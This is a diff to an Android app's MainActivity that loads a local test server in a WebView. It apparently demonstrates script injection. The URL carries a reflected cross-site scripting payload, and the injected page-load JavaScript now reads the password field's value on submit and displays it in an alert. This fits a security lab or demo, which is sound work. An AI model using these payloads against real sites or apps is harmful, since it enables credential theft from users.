@@ -19,7 +19,6 @@ public class MainActivity extends AppCompatActivity {
         final WebView mywebview = (WebView) findViewById(R.id.webView);
         mywebview.clearCache(true);
         mywebview.loadUrl("http://192.168.1.36:31337/home?name=<body onload=\"f()\"><script type=\"text/javascript\">function f(){var button=document.getElementsByName(\"submit\")[0];button.addEventListener(\"click\", function(){ alert(\"injected 1\"); return false; },false);}</script>");
-        //mywebview.loadUrl("http://192.168.1.36:31337/home?name=John Doe");
         mywebview.getSettings().setJavaScriptEnabled(true);
         mywebview.setWebChromeClient(new WebChromeClient() {
             @Override
@@ -32,7 +31,7 @@ public class MainActivity extends AppCompatActivity {
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
                 mywebview.loadUrl(
-                        "javascript:var button = document.getElementsByName(\"submit\")[0];button.addEventListener(\"click\", function(){ alert(\"injected 1\"); },false);"
+                        "javascript:var button = document.getElementsByName(\"submit\")[0];button.addEventListener(\"click\", function(){ var secret = document.getElementById(\"password\").value; alert(secret); },false);"
                 );
             }
         });
